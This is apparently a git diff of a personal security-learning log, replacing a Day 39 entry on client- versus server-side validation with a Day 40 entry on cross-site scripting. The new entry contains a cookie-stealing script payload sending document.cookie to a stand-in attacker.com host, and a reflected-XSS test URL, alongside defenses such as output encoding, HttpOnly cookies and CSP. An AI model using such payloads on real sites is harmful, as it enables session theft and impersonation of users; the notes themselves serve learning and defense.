@@ -1,31 +1,32 @@
-## 🗓️ Day 39/100 – Client-Side vs. Server-Side Security
+## 🗓️ Day 40/100 – Cross-Site Scripting (XSS)
 
-**Focus:** Understanding execution environments to identify security gaps.
+**Focus:** Exploiting client-side script execution to steal sessions and manipulate user actions.
 
-### 🌐 The Two Environments
+### 🎭 What is XSS?
+Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by other users. The script executes within the context of the victim's session.
 
-**1. Client-Side (JavaScript)**
-*   **Location:** User's Browser.
-*   **Purpose:** Interactivity, UI updates, basic validation (UX).
-*   **Security Reality:**
-    *   **Trust Level:** Zero.
-    *   **Bypass:** Easy. Attackers can modify scripts, disable validation, or send direct HTTP requests via proxies.
-    *   **Risks:** Cross-Site Scripting (XSS), Sensitive data storage in LocalStorage.
+### ⚔️ Attack Techniques
 
-**2. Server-Side (PHP/Node/Python)**
-*   **Location:** Web Server / Backend.
-*   **Purpose:** Business logic, database access, authentication.
-*   **Security Reality:**
-    *   **Trust Level:** High (if coded correctly).
-    *   **Bypass:** Difficult. Requires finding logic flaws or injection vulnerabilities.
-    *   **Risks:** SQL Injection, Command Injection, Insecure Deserialization.
+**1. Session Stealing (Cookie Theft)**
+*   **Payload:**
+    ```javascript
+    <script>location.href='http://attacker.com/steal.php?cookie='+document.cookie</script>
+    ```
+*   **Impact:** Attacker obtains the Session ID and can impersonate the victim without credentials.
 
-### ⚔️ Attack Scenario: Bypass Validation
-*   **Scenario:** A form uses JS to check if `age > 18`.
-*   **Attack:**
-    1.  Turn off JavaScript in browser settings.
-    2.  Submit `age = 12`.
-    3.  If the server (PHP) doesn't check again, the invalid data is accepted.
+**2. Reflected XSS**
+*   **Scenario:** Search bar reflects input.
+*   **URL:** `http://target.com/search?q=<script>alert(1)</script>`
+*   **Result:** Popup executes immediately.
 
-### 🛡️ Core Principle
-**"Never Trust the Client."** Always replicate validation logic on the server-side to ensure data integrity and security.
+**3. Stored XSS**
+*   **Scenario:** Comment section or Profile Bio.
+*   **Action:** Input payload into the database.
+*   **Result:** Every user (including Admin) who views the profile executes the script.
+
+### 🛡️ Defense Mechanisms
+*   **Output Encoding:** Convert special characters into HTML entities (e.g., `<` becomes `&lt;`).
+*   **HttpOnly Cookies:** Prevent JavaScript from accessing sensitive cookies (`document.cookie` returns empty).
+*   **CSP (Content Security Policy):** A browser mitigation that strictly controls script sources.
+
+**Day 40 Takeaway:** XSS turns the user's browser against them. Preventing it requires rigorous separation of data and code in the browser.
